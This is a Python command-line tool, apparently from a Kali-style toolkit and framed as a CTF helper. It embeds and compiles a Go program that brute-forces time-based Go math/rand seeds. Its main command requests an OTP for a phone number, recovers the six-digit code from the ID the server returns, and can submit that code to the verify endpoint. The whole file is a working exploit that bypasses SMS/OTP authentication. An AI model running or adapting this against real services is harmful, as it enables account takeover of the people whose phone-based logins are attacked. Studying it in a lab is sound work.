#!/usr/bin/env python3
from __future__ import annotations

import argparse
import http.cookiejar
import json
import os
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Any


FLAG_RE = re.compile(r"flag\{[^}\s]+\}", re.IGNORECASE)
DEFAULT_CODE_CHARSET = "0123456789"
DEFAULT_ID_CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
GO_CRACKER_SOURCE = r'''
package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	"os"
)

type Result struct {
	Found bool   `json:"found"`
	Seed  int64  `json:"seed,omitempty"`
	Code  string `json:"code,omitempty"`
	ID    string `json:"id,omitempty"`
}

func randomString(r *rand.Rand, length int, charset string) string {
	out := make([]byte, length)
	for i := 0; i < length; i++ {
		out[i] = charset[r.Intn(len(charset))]
	}
	return string(out)
}

func main() {
	start := flag.Int64("start-us", 0, "first Unix microsecond seed to test")
	end := flag.Int64("end-us", 0, "last Unix microsecond seed to test")
	targetID := flag.String("target-id", "", "observed ID generated after the code")
	codeLen := flag.Int("code-len", 6, "code length")
	idLen := flag.Int("id-len", 32, "ID length")
	codeCharset := flag.String("code-charset", "0123456789", "code charset")
	idCharset := flag.String("id-charset", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", "ID charset")
	flag.Parse()
	if *targetID == "" || *end < *start {
		fmt.Fprintln(os.Stderr, "invalid search arguments")
		os.Exit(2)
	}
	for seed := *start; seed <= *end; seed++ {
		r := rand.New(rand.NewSource(seed))
		code := randomString(r, *codeLen, *codeCharset)
		id := randomString(r, *idLen, *idCharset)
		if id == *targetID {
			_ = json.NewEncoder(os.Stdout).Encode(Result{Found: true, Seed: seed, Code: code, ID: id})
			return
		}
	}
	_ = json.NewEncoder(os.Stdout).Encode(Result{Found: false})
	os.Exit(1)
}
'''


def utc_now() -> str:
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat()


def write_json(path: Path, data: Any) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(data, ensure_ascii=False, indent=2, sort_keys=True) + "\n", encoding="utf-8")


def slug(value: str) -> str:
    value = value.lower().strip()
    value = re.sub(r"[^a-z0-9]+", "-", value).strip("-")
    return value or "artifact"


def ensure_case(case_dir: str | Path) -> Path:
    path = Path(case_dir)
    path.mkdir(parents=True, exist_ok=True)
    for child in ["artifacts", "responses", "notes", "files"]:
        (path / child).mkdir(exist_ok=True)
    return path


def find_go() -> str:
    candidates = [
        os.environ.get("KALI_GO", ""),
        str(Path.home() / ".cache/kali-skill/go-runtime/go/bin/go"),
        str(Path.home() / ".local/bin/go"),
        "go",
    ]
    for candidate in candidates:
        if not candidate:
            continue
        try:
            completed = subprocess.run(
                [candidate, "version"],
                check=False,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=10,
            )
        except (FileNotFoundError, subprocess.TimeoutExpired):
            continue
        if completed.returncode == 0:
            return candidate
    raise SystemExit("Go runtime not found. Install Go or set KALI_GO=/path/to/go")


def build_go_cracker() -> Path:
    cache_dir = Path.home() / ".cache/kali-skill/go-rand-cracker"
    cache_dir.mkdir(parents=True, exist_ok=True)
    source = cache_dir / "go_rand_cracker.go"
    binary = cache_dir / "go_rand_cracker"
    if not source.exists() or source.read_text(encoding="utf-8") != GO_CRACKER_SOURCE:
        source.write_text(GO_CRACKER_SOURCE, encoding="utf-8")
        if binary.exists():
            binary.unlink()
    if not binary.exists():
        go = find_go()
        subprocess.run([go, "build", "-o", str(binary), str(source)], check=True, timeout=60)
    return binary


def headers_from_args(items: list[str] | None) -> dict[str, str]:
    headers = {"User-Agent": "kali-ctf-prng/1.0"}
    for item in items or []:
        if ":" not in item:
            raise SystemExit(f"invalid header, expected name:value: {item}")
        name, value = item.split(":", 1)
        headers[name.strip()] = value.strip()
    return headers


def resolve_url(base_url: str, path_or_url: str) -> str:
    if path_or_url.startswith("http://") or path_or_url.startswith("https://"):
        return path_or_url
    return urllib.parse.urljoin(base_url.rstrip("/") + "/", path_or_url.lstrip("/"))


def save_http_response(path: Path, url: str, method: str, status: int, reason: str, headers: dict[str, str], body: bytes) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    lines = [f"HTTP/1.1 {status} {reason}\n"]
    for name, value in headers.items():
        lines.append(f"{name}: {value}\n")
    lines.append(f"\n")
    path.write_bytes("".join(lines).encode("utf-8") + body)


def json_request(
    opener: urllib.request.OpenerDirector,
    url: str,
    payload: dict[str, Any],
    headers: dict[str, str],
    timeout: int,
) -> tuple[int, str, dict[str, str], bytes]:
    body = json.dumps(payload, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    request_headers = dict(headers)
    request_headers["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=body, headers=request_headers, method="POST")
    try:
        with opener.open(req, timeout=timeout) as response:
            return response.status, response.reason, dict(response.headers.items()), response.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.reason, dict(exc.headers.items()), exc.read()


def recover_go_rand_code(
    *,
    target_id: str,
    start_us: int,
    end_us: int,
    code_len: int,
    id_len: int,
    code_charset: str,
    id_charset: str,
) -> dict[str, Any]:
    binary = build_go_cracker()
    command = [
        str(binary),
        "-start-us",
        str(start_us),
        "-end-us",
        str(end_us),
        "-target-id",
        target_id,
        "-code-len",
        str(code_len),
        "-id-len",
        str(id_len),
        "-code-charset",
        code_charset,
        "-id-charset",
        id_charset,
    ]
    completed = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=120)
    data = json.loads(completed.stdout or "{}")
    data["returncode"] = completed.returncode
    data["stderr"] = completed.stderr
    data["search_size"] = max(0, end_us - start_us + 1)
    data["binary"] = str(binary)
    return data


def command_go_rand_predict(args: argparse.Namespace) -> None:
    case_dir = ensure_case(args.case_dir)
    result = recover_go_rand_code(
        target_id=args.target_id,
        start_us=args.start_us,
        end_us=args.end_us,
        code_len=args.code_len,
        id_len=args.id_len,
        code_charset=args.code_charset,
        id_charset=args.id_charset,
    )
    output = case_dir / "artifacts" / f"{slug(args.label)}-go-rand-predict.json"
    write_json(output, {"time": utc_now(), "target_id": args.target_id, "start_us": args.start_us, "end_us": args.end_us, "result": result})
    print(json.dumps({"status": "ok" if result.get("found") else "not-found", "summary": str(output), "result": result}, ensure_ascii=False, indent=2))


def command_go_rand_otp(args: argparse.Namespace) -> None:
    case_dir = ensure_case(args.case_dir)
    label = slug(args.label)
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    headers = headers_from_args(args.header)
    generate_url = resolve_url(args.base_url, args.generate_path)
    verify_url = resolve_url(args.base_url, args.verify_path)

    start_ns = time.time_ns()
    gen_status, gen_reason, gen_headers, gen_body = json_request(
        opener,
        generate_url,
        {"phone": args.phone},
        headers,
        args.timeout,
    )
    end_ns = time.time_ns()
    generate_response = case_dir / "responses" / f"{label}_generate.http"
    save_http_response(generate_response, generate_url, "POST", gen_status, gen_reason, gen_headers, gen_body)
    try:
        gen_json = json.loads(gen_body.decode("utf-8", errors="replace"))
    except json.JSONDecodeError as exc:
        raise SystemExit(f"generate response is not JSON: {exc}")
    target_id = str(gen_json.get("id", ""))
    if not target_id:
        raise SystemExit("generate response did not include id")

    window_us = args.window_ms * 1000
    start_us = start_ns // 1000 + args.clock_offset_us - window_us
    end_us = end_ns // 1000 + args.clock_offset_us + window_us
    prediction = recover_go_rand_code(
        target_id=target_id,
        start_us=start_us,
        end_us=end_us,
        code_len=args.code_len,
        id_len=args.id_len,
        code_charset=args.code_charset,
        id_charset=args.id_charset,
    )

    verify_status = None
    verify_reason = ""
    verify_headers: dict[str, str] = {}
    verify_body = b""
    verify_response = None
    if prediction.get("found") and args.verify:
        verify_status, verify_reason, verify_headers, verify_body = json_request(
            opener,
            verify_url,
            {"phone": args.phone, "code": prediction["code"], "id": target_id},
            headers,
            args.timeout,
        )
        verify_response = case_dir / "responses" / f"{label}_verify.http"
        save_http_response(verify_response, verify_url, "POST", verify_status, verify_reason, verify_headers, verify_body)

    flags = sorted(set(FLAG_RE.findall(verify_body.decode("utf-8", errors="replace"))))
    summary = {
        "time": utc_now(),
        "base_url": args.base_url,
        "phone": args.phone,
        "generate_url": generate_url,
        "verify_url": verify_url,
        "target_id": target_id,
        "start_us": start_us,
        "end_us": end_us,
        "window_ms": args.window_ms,
        "generate_status": gen_status,
        "generate_response": str(generate_response),
        "prediction": prediction,
        "verify": {
            "enabled": args.verify,
            "status": verify_status,
            "reason": verify_reason,
            "response": str(verify_response) if verify_response else None,
            "body_sample": verify_body[:1000].decode("utf-8", errors="replace"),
            "flags": flags,
        },
    }
    output = case_dir / "artifacts" / f"{label}-go-rand-otp.json"
    write_json(output, summary)
    print(
        json.dumps(
            {
                "status": "ok" if prediction.get("found") else "not-found",
                "summary": str(output),
                "target_id": target_id,
                "code": prediction.get("code"),
                "seed": prediction.get("seed"),
                "verify_status": verify_status,
                "flags": flags,
            },
            ensure_ascii=False,
            indent=2,
        )
    )


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Reusable PRNG prediction helpers for CTF challenges")
    sub = parser.add_subparsers(dest="command", required=True)

    predict = sub.add_parser("go-rand-predict", help="recover a Go math/rand UnixMicro seed from an observed generated ID")
    predict.add_argument("--case-dir", required=True)
    predict.add_argument("--target-id", required=True)
    predict.add_argument("--start-us", type=int, required=True)
    predict.add_argument("--end-us", type=int, required=True)
    predict.add_argument("--code-len", type=int, default=6)
    predict.add_argument("--id-len", type=int, default=32)
    predict.add_argument("--code-charset", default=DEFAULT_CODE_CHARSET)
    predict.add_argument("--id-charset", default=DEFAULT_ID_CHARSET)
    predict.add_argument("--label", default="go-rand-predict")
    predict.set_defaults(func=command_go_rand_predict)

    otp = sub.add_parser("go-rand-otp", help="request a Go math/rand OTP, recover the code from returned ID, and optionally verify it")
    otp.add_argument("--case-dir", required=True)
    otp.add_argument("--base-url", required=True)
    otp.add_argument("--phone", required=True)
    otp.add_argument("--generate-path", default="/generate-code")
    otp.add_argument("--verify-path", default="/verify-code")
    otp.add_argument("--window-ms", type=int, default=750)
    otp.add_argument("--clock-offset-us", type=int, default=0)
    otp.add_argument("--code-len", type=int, default=6)
    otp.add_argument("--id-len", type=int, default=32)
    otp.add_argument("--code-charset", default=DEFAULT_CODE_CHARSET)
    otp.add_argument("--id-charset", default=DEFAULT_ID_CHARSET)
    otp.add_argument("--header", action="append")
    otp.add_argument("--timeout", type=int, default=20)
    otp.add_argument("--verify", action="store_true")
    otp.add_argument("--label", default="go-rand-otp")
    otp.set_defaults(func=command_go_rand_otp)
    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()
    args.func(args)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
